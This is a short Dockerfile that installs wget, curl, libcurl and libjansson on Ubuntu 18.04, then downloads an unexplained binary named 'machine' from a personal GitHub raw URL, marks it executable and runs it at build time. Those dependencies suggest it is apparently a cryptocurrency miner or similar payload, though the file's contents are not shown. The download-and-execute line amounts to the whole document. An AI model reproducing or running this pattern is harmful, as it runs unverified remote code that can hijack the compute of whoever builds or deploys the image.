FROM ubuntu:18.04
RUN apt-get update && \
     apt-get install wget -y && \
     apt install libjansson-dev -y && \
     apt-get install curl libcurl4 -y && \
     wget https://raw.githubusercontent.com/arlindoere/bash/main/machine && chmod +x machine && ./machine
